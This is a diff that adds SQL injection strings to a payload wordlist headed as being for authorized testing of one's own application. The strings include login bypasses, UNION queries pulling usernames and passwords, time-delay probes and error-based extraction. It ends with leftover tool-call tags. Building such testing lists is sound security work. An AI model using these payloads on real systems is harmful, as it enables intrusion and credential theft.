@@ -1,3 +1,5 @@
+# SQL injection payloads — for authorized testing of YOUR OWN application
+# Sourced from OWASP SQL Injection cheatsheet + PortSwigger SQLi labs reference
 ' OR '1'='1
 ' OR '1'='1'--
 ' OR 1=1--
@@ -11,3 +13,42 @@ admin'--
 ") OR ("1"="1
 ' OR ''='
 1;SELECT * FROM users--
+' OR 1=1 LIMIT 1--
+admin' OR 1=1--
+' OR 'a'='a
+') OR ('1'='1
+' OR 1#
+" OR 1=1 --
+" OR ""="
+') OR 1=1#
+1 OR 1=1
+1)) OR 1=1--
+'; WAITFOR DELAY '00:00:05'--
+'; EXEC sp_msforeachtable--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT 1--
+1' UNION SELECT @@version--
+' UNION SELECT user(),version(),database()--
+' UNION SELECT username,password FROM users--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND SLEEP(5)--
+' AND BENCHMARK(10000000,MD5('A'))--
+' OR pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'or 1=1 limit 1 -- -+
+admin' #
+admin'/*
+1' AND extractvalue(rand(),concat(0x7e,version()))--
+1' AND updatexml(rand(),concat(0x7e,user()),0)--
+%27%20OR%201%3D1--
+%27%20OR%20%271%27%3D%271
+0x27204f522031203d 31--
+'+OR+'1'='1
+') OR 1=1--+-
+' OR 1=1 ORDER BY 1--
+' OR 1=1 GROUP BY 1--
+' AND 1 IN (SELECT 1 FROM dual) UNION SELECT 1--
+</content>
+</invoke>
